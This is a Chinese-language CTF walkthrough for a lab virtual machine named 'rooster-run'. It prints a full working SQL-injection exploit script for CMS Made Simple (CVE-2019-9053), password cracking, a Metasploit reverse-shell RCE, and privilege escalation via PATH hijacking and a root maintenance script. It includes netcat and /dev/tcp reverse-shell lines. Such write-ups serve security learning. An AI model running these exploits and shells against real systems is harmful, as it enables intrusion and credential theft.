# 信息搜集

主机发现

```
┌──(kali㉿kali)-[~]
└─$ nmap -sn 192.168.2.0/24     
Starting Nmap 7.95 ( https://nmap.org ) at 2026-03-16 02:29 EDT
Nmap scan report for rooster-run (192.168.2.21)
Host is up (0.00023s latency).
MAC Address: 08:00:27:7D:3D:37 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Nmap scan report for kali (192.168.2.12)
Host is up.
Nmap done: 256 IP addresses (7 hosts up) scanned in 2.68 seconds
```

端口扫描

```
┌──(kali㉿kali)-[~]
└─$ nmap -A -p- 192.168.2.21
Starting Nmap 7.95 ( https://nmap.org ) at 2026-03-16 02:30 EDT
Nmap scan report for rooster-run (192.168.2.21)
Host is up (0.00029s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2 (protocol 2.0)
| ssh-hostkey: 
|   256 dd:83:da:cb:45:d3:a8:ea:c6:be:19:03:45:76:43:8c (ECDSA)
|_  256 e5:5f:7f:25:aa:c0:18:04:c4:46:98:b3:5d:a5:2b:48 (ED25519)
80/tcp open  http    Apache httpd 2.4.57 ((Debian))
|_http-title: Home - Blog
|_http-generator: CMS Made Simple - Copyright (C) 2004-2023. All rights reserved.
|_http-server-header: Apache/2.4.57 (Debian)
MAC Address: 08:00:27:7D:3D:37 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Device type: general purpose|router
Running: Linux 4.X|5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 4.15 - 5.19, OpenWrt 21.02 (Linux 5.4), MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   0.29 ms rooster-run (192.168.2.21)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.24 seconds
```

# 漏洞利用

看一下80端口，发现CMS Made Simple version 2.2.9.1，先目录扫描着在找一下漏洞

```
┌──(kali㉿kali)-[~]
└─$ searchsploit Made Simple 2.2.9.1        
----------------------------------- ---------------------------------
 Exploit Title                     |  Path
----------------------------------- ---------------------------------
CMS Made Simple < 2.2.10 - SQL Inj | php/webapps/46635.py
----------------------------------- ---------------------------------
Shellcodes: No Results
Papers: No Results
┌──(kali㉿kali)-[~]
└─$ searchsploit -m 46635                       
  Exploit: CMS Made Simple < 2.2.10 - SQL Injection
      URL: https://www.exploit-db.com/exploits/46635
     Path: /usr/share/exploitdb/exploits/php/webapps/46635.py
    Codes: CVE-2019-9053
 Verified: False
File Type: Python script, ASCII text executable
Copied to: /home/kali/46635.py
```

不过没法用，去github找一下有没有python3的

```
┌──(kali㉿kali)-[~]
└─$ cat 46635.py 
#!/usr/bin/env python
# Exploit Title: Unauthenticated SQL Injection on CMS Made Simple <= 2.2.9
# Original-Date: 30-03-2019
# Edited-Date: 27-5-2023
# Exploit Author: Daniele Scanu @ Certimeter Group
# Edited by: Mohammed M., Mr. Misconception 
# Vendor Homepage: https://www.cmsmadesimple.org/
# Software Link: https://www.cmsmadesimple.org/downloads/cmsms/
# Version: <= 2.2.9
# Tested on: Ubuntu 18.04 LTS
# CVE : CVE-2019-9053

import requests
from termcolor import colored
import time
from termcolor import cprint
import argparse
import hashlib
from tqdm import tqdm

parser = argparse.ArgumentParser()
parser.add_argument('-u', '--url', type=str, help="Base target uri (ex. http://10.10.10.100/cms)")
parser.add_argument('-w', '--wordlist', type=str, help="Wordlist for crack admin password")
parser.add_argument('-c', '--crack', action="store_true", help="Crack password with wordlist", default=False)
parser.add_argument('-t', '--time', type=int, help="Time for SQLIi time based attack, default = 1 (second). The slower your internet is the larger this number should be.", default=1)
parser.add_argument("-s", "--salt", type=str, help="Salt for the password cracking")
parser.add_argument("-p", "--password", type=str, help="Password hash to crack")

options = parser.parse_args()
if not options.url and (not options.password or not options.salt):
    print("[+] Specify an url target")
    print("[+] Example usage (no cracking password): exploit.py -u http://target-uri")
    print("[+] Example usage (with cracking password): exploit.py -u http://target-uri --crack -w /path-wordlist")
    print("[+] Example usage (with 5 second wait selected): exploit.py -u http://target-uri -t 5")
    exit()

if options.url:
    url_vuln = options.url + '/moduleinterface.php?mact=News,m1_,default,0'
session = requests.Session()
dictionary = '1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM@._-$'
flag = True
password = options.password if options.password else ""
temp_password = ""
TIME = options.time
db_name = ""
output = ""
email = ""

salt = options.salt if options.salt else ""
wordlist = ""
if options.wordlist:
    wordlist += options.wordlist


def crack_password():
    global password
    global output
    global wordlist
    global salt
    encodings = ["utf-8", "latin-1", "ascii"]

    def process_lines(wordlist_lines, progress):
        global output
        for line in wordlist_lines:
            line = line.strip()
            encoded_line = (str(salt) + line).encode("utf-8")
            if hashlib.md5(encoded_line).hexdigest() == password:
                output += "\n[+] Password cracked: " + line
                progress.close()
                return True
            progress.update(1)
        return False

    for encoding in encodings:
        try:
            with open(wordlist, "r", encoding=encoding) as dict_file:
                lines = dict_file.readlines()
                total_lines = len(lines)

                with tqdm(total=total_lines, desc="Progress", unit="lines") as progress_bar:
                    if process_lines(lines, progress_bar):
                        return
        except UnicodeDecodeError:
            continue
        except Exception as e:
            print(f"Error: {e}")
            continue


def beautify_print_try(value):
    global output
    print("\033c")
    cprint(output, 'green', attrs=['bold'])
    cprint('[*] Try: ' + value, 'red', attrs=['bold'])


def beautify_print():
    global output
    print("\033c")
    cprint(output, 'green', attrs=['bold'])


def dump_salt():
    global flag
    global salt
    global output
    ord_salt = ""
    ord_salt_temp = ""
    temp_salt = ""
    while flag:
        flag = False
        for i in range(0, len(dictionary)):
            temp_salt = salt + dictionary[i]
            ord_salt_temp = ord_salt + hex(ord(dictionary[i]))[2:]
            beautify_print_try(temp_salt)
            payload = "a,b,1,5))+and+(select+sleep(" + str(TIME) + ")+from+cms_siteprefs+where+sitepref_value+like+0x" + ord_salt_temp + "25+and+sitepref_name+like+0x736974656d61736b)+--+"
            url = url_vuln + "&m1_idlist=" + payload
            start_time = time.time()
            session.get(url)
            elapsed_time = time.time() - start_time
            if elapsed_time >= TIME:
                flag = True
                break
        if flag:
            salt = temp_salt
            ord_salt = ord_salt_temp
    flag = True
    output += '\n[+] Salt for password found: ' + salt


def dump_password():
    global flag
    global password
    global output
    ord_password = ""
    ord_password_temp = ""
    temp_pass = ""
    while flag:
        flag = False
        for i in range(0, len(dictionary)):
            temp_pass = password + dictionary[i]
            ord_password_temp = ord_password + hex(ord(dictionary[i]))[2:]
            beautify_print_try(temp_pass)
            payload = "a,b,1,5))+and+(select+sleep(" + str(TIME) + ")+from+cms_users"
            payload += "+where+password+like+0x" + ord_password_temp + "25+and+user_id+like+0x31)+--+"
            url = url_vuln + "&m1_idlist=" + payload
            start_time = time.time()
            session.get(url)
            elapsed_time = time.time() - start_time
            if elapsed_time >= TIME:
                flag = True
                break
        if flag:
            password = temp_pass
            ord_password = ord_password_temp
    flag = True
    output += '\n[+] Password found: ' + password


def dump_username():
    global flag
    global db_name
    global output
    ord_db_name = ""
    ord_db_name_temp = ""
    temp_db_name = ""
    while flag:
        flag = False
        for i in range(0, len(dictionary)):
            temp_db_name = db_name + dictionary[i]
            ord_db_name_temp = ord_db_name + hex(ord(dictionary[i]))[2:]
            beautify_print_try(temp_db_name)
            payload = "a,b,1,5))+and+(select+sleep(" + str(TIME) + ")+from+cms_users+where+username+like+0x" + ord_db_name_temp + "25+and+user_id+like+0x31)+--+"
            url = url_vuln + "&m1_idlist=" + payload
            start_time = time.time()
            session.get(url)
            elapsed_time = time.time() - start_time
            if elapsed_time >= TIME:
                flag = True
                break
        if flag:
            db_name = temp_db_name
            ord_db_name = ord_db_name_temp
    output += '\n[+] Username found: ' + db_name
    flag = True


def dump_email():
    global flag
    global email
    global output
    ord_email = ""
    ord_email_temp = ""
    temp_email = ""
    while flag:
        flag = False
        for i in range(0, len(dictionary)):
            temp_email = email + dictionary[i]
            ord_email_temp = ord_email + hex(ord(dictionary[i]))[2:]
            beautify_print_try(temp_email)
            payload = "a,b,1,5))+and+(select+sleep(" + str(TIME) + ")+from+cms_users+where+email+like+0x" + ord_email_temp + "25+and+user_id+like+0x31)+--+"
            url = url_vuln + "&m1_idlist=" + payload
            start_time = time.time()
            session.get(url)
            elapsed_time = time.time() - start_time
            if elapsed_time >= TIME:
                flag = True
                break
        if flag:
            email = temp_email
            ord_email = ord_email_temp
    output += '\n[+] Email found: ' + email
    flag = True


if not options.password or not options.salt:
    dump_salt()
    dump_username()
    dump_email()
    dump_password()

if options.crack:
    print(colored("[*] Now trying to crack password"))
    crack_password()

beautify_print()
┌──(kali㉿kali)-[~]
└─$ python3 46635.py -u http://192.168.2.21
[+] Salt for password found: 1a0112229fbd699d
[+] Username found: admin
[+] Email found: admin@localhost.com
[+] Password found: 4f943036486b9ad48890b2efbf7735a8
```

解密一下

```
┌──(kali㉿kali)-[~]
└─$ python3 46635.py -u http://192.168.2.21 -c -w /usr/share/wordlists/rockyou.txt -s 1a0112229fbd699d -p 4f943036486b9ad48890b2efbf7735a8
[+] Password cracked: homeandaway
```

目录扫描也出来了

```
┌──(kali㉿kali)-[~]
└─$ gobuster dir -u http://192.168.2.21 -w SecLists/Discovery/Web-Content/directory-list-lowercase-2.3-big.txt -x html,php,txt,jpg,png,zip,git
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.2.21
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                SecLists/Discovery/Web-Content/directory-list-lowercase-2.3-big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php,txt,jpg,png,zip,git,html
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.html                (Status: 403) [Size: 277]
/.php                 (Status: 403) [Size: 277]
/index.php            (Status: 200) [Size: 19337]
/modules              (Status: 301) [Size: 314] [--> http://192.168.2.21/modules/]                                                        
/uploads              (Status: 301) [Size: 314] [--> http://192.168.2.21/uploads/]                                                        
/doc                  (Status: 301) [Size: 310] [--> http://192.168.2.21/doc/]                                                            
/admin                (Status: 301) [Size: 312] [--> http://192.168.2.21/admin/]                                                          
/assets               (Status: 301) [Size: 313] [--> http://192.168.2.21/assets/]                                                         
/lib                  (Status: 301) [Size: 310] [--> http://192.168.2.21/lib/]                                                            
/config.php           (Status: 200) [Size: 0]
/tmp                  (Status: 301) [Size: 310] [--> http://192.168.2.21/tmp/]                                                            
/.php                 (Status: 403) [Size: 277]
/.html                (Status: 403) [Size: 277]
/server-status        (Status: 403) [Size: 277]
/logitech-quickcam_w0qqcatrefzc5qqfbdz1qqfclz3qqfposz95112qqfromzr14qqfrppz50qqfsclz1qqfsooz1qqfsopz1qqfssz0qqfstypez1qqftrtz1qqftrvz1qqftsz2qqnojsprzyqqpfidz0qqsaatcz1qqsacatzq2d1qqsacqyopzgeqqsacurz0qqsadisz200qqsaslopz1qqsofocuszbsqqsorefinesearchz1.html (Status: 403) [Size: 277]
Progress: 9482032 / 9482040 (100.00%)
===============================================================
Finished
===============================================================
```

寻找到了rce漏洞

```
msf6 > search CMS Made Simple 2.2.9.1

Matching Modules
================

   #  Name                                           Disclosure Date  Rank    Check  Description
   -  ----                                           ---------------  ----    -----  -----------
   0  exploit/multi/http/cmsms_showtime2_rce         2019-03-11       normal  Yes    CMS Made Simple (CMSMS) Showtime2 File Upload RCE
   1  exploit/multi/http/cmsms_object_injection_rce  2019-03-26       normal  Yes    CMS Made Simple Authenticated RCE via object injection


Interact with a module by name or index. For example info 1, use 1 or use exploit/multi/http/cmsms_object_injection_rce
msf6 > use 1
[*] No payload configured, defaulting to php/meterpreter/reverse_tcp
msf6 exploit(multi/http/cmsms_object_injection_rce) > options

Module options (exploit/multi/http/cmsms_object_injection_rce):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   PASSWORD                    yes       Password to authenticate w
                                         ith
   Proxies                     no        A proxy chain of format ty
                                         pe:host:port[,type:host:po
                                         rt][...]. Supported proxie
                                         s: sapni, socks4, socks5,
                                         socks5h, http
   RHOSTS                      yes       The target host(s), see ht
                                         tps://docs.metasploit.com/
                                         docs/using-metasploit/basi
                                         cs/using-metasploit.html
   RPORT      80               yes       The target port (TCP)
   SSL        false            no        Negotiate SSL/TLS for outg
                                         oing connections
   TARGETURI  /                yes       Base cmsms directory path
   USERNAME                    yes       Username to authenticate w
                                         ith
   VHOST                       no        HTTP server virtual host


Payload options (php/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  192.168.2.12     yes       The listen address (an interfa
                                     ce may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic



View the full module info with the info, or info -d command.

msf6 exploit(multi/http/cmsms_object_injection_rce) > set password homeandaway
password => homeandaway
msf6 exploit(multi/http/cmsms_object_injection_rce) > set rhosts 192.168.2.21
rhosts => 192.168.2.21
msf6 exploit(multi/http/cmsms_object_injection_rce) > set username admin
username => admin
msf6 exploit(multi/http/cmsms_object_injection_rce) > run
[*] Started reverse TCP handler on 192.168.2.12:4444 
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target appears to be vulnerable.
[*] Sending stage (40004 bytes) to 192.168.2.21
[+] Deleted MVWIKdsHUPBq.php
[*] Meterpreter session 1 opened (192.168.2.12:4444 -> 192.168.2.21:59056) at 2026-03-16 03:04:40 -0400
meterpreter > shell
Process 1343 created.
Channel 0 created.
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

# 权限提升

找到了一个脚本，#!/usr/bin/env bash，env会根据PATH查找bash，可能存在PATH劫持

```
www-data@rooSter-Run:/home/matthieu$ cat StaleFinder
cat StaleFinder
#!/usr/bin/env bash

for file in ~/*; do
    if [[ -f $file ]]; then
        if [[ ! -s $file ]]; then
            echo "$file is empty."
        fi
        
        if [[ $(find "$file" -mtime +365 -print) ]]; then
            echo "$file hasn't been modified for over a year."
        fi
    fi
done
```

尝试提权

```
www-data@rooSter-Run:/home/matthieu$ echo -e '#!/bin/bash\nnc 192.168.2.12 4444 -e /bin/bash' > /usr/local/bin/bash
<2.168.2.12 4444 -e /bin/bash' > /usr/local/bin/bash
www-data@rooSter-Run:/home/matthieu$ chmod 777 /usr/local/bin/bash
chmod 777 /usr/local/bin/bash
┌──(kali㉿kali)-[~]
└─$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [192.168.2.12] from (UNKNOWN) [192.168.2.21] 37084
id
uid=1000(matthieu) gid=1000(matthieu) groups=1000(matthieu),100(users)
```

找到了脚本，可以在/opt/maintenance/pre-prod-tasks写文件，就可以把恶意脚本复制到prod-tasks，然后被执行

```
matthieu@rooSter-Run:/opt/maintenance$ cat backup.sh
cat /opt/maintenance/backup.sh
#!/bin/bash

PROD="/opt/maintenance/prod-tasks"
PREPROD="/opt/maintenance/pre-prod-tasks"


for file in "$PREPROD"/*; do
  if [[ -f $file && "${file##*.}" = "sh" ]]; then
    cp "$file" "$PROD"
  else
    rm -f ${file}
  fi
done

for file in "$PROD"/*; do
  if [[ -f $file && ! -O $file ]]; then
  rm ${file}
  fi
done

/usr/bin/run-parts /opt/maintenance/prod-tasks
matthieu@rooSter-Run:/opt/maintenance$ ls -la /opt/maintenance/pre-prod-tasks
ls -la /opt/maintenance/pre-prod-tasks
total 8
drwx---rwt 2 root root 4096 Sep 24  2023 .
drwxr-xr-x 4 root root 4096 Sep 24  2023 ..

echo '#!/bin/bash' > exp.sh
echo '/bin/bash -c"/bin/bash -i >& /dev/tcp/192.168.2.12/5555 0>&1"' >> exp.sh
chmod 777 exp.sh
将其改名为exp
```
